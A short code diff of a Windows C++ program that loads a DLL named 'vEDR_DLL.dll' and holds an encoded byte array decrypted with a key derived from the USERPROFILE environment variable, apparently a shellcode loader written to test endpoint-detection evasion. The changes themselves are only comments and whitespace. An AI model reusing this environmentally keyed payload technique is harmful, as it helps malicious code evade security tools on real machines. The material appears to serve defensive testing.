@@ -2,7 +2,6 @@
 #include <iostream>
 #include <windows.h>
 
-
 int main() {
 
     HMODULE hDll = LoadLibraryA("vEDR_DLL.dll");
@@ -30,11 +29,11 @@ int main() {
             "\x19\x78\x65\x60\x0a\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24"
             "\x6f\x72\x6f\x0a";
 
-
+    // VS
     char* USERPROFILE;
-
      _dupenv_s(&USERPROFILE, nullptr, "USERPROFILE");
 
+    //MINGW
     //std::string USERPROFILE = getenv("USERPROFILE");
 
     const std::uint8_t key = static_cast<std::uint8_t>(USERPROFILE[0]) - 57;
